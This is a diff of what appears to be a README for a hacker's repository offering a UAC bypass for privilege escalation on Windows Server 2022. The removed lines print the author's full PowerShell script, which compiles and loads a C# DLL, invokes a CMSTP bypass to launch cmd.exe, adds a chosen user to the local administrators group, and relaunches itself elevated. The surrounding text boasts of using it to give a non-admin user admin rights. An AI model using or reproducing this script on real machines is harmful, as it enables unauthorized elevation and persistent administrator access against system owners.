@@ -25,34 +25,11 @@
 * Well behold we popped it again and i was like fuck its working nicely, added user thats non admin group to the admingroup to be able to exec elevated powershell. 
 
 
-# code example of the ps1 file i made for the UAC bypass 
+# code example of the ps1 file i made for the UAC bypass u can find in the repo
 * This particular code needs to files to make it all work i will include all of them here in the repo. 
 
 
-#!-.ps1 
-#
-# Author : P.Hoogeveem
-# Aka    : x0xr00t
-# Build  : 20210809
-# Name   : UAC Bypass Win Server 2022
-# Impact : Privesc 
-# 
-# Usage  : run the powershell file and it makes the dll and places it in dir. 
 
 
-#
-Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
-
-[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
-
-[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
-net localgroup administrators {userhere} /add
-If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
-{
-  # Relaunch as an elevated process:
-  Start-Process powershell.exe "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb RunAs
-  exit
-}
-
-
-# Thats it enjoy
+# Thats it privesc windows server 2022 
+* X0xr00t 
